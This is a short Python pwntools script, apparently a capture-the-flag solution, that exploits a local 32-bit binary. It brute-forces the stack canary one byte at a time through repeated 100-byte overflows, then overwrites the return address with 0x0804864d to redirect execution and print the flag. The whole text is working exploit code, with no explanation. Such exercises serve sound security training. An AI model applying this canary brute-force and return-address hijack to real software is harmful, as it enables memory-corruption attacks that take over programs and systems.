from pwn import *
context.log_level = 'debug'

t = process('./bin')

t.recvuntil('welcome\n')
canary = '\x00'
for i in range(3):
    for j in range(0x100):
        t.send('a'*100 + canary + chr(j))
        a = t.recvuntil('welcome\n')
        if 'recv' in a:
            canary += chr(j)
            break

t.sendline('a'*100 + canary + 'a'*12 + p32(0x0804864d))

flag = t.recv()
t.close()
log.success('flag is:' + flag)

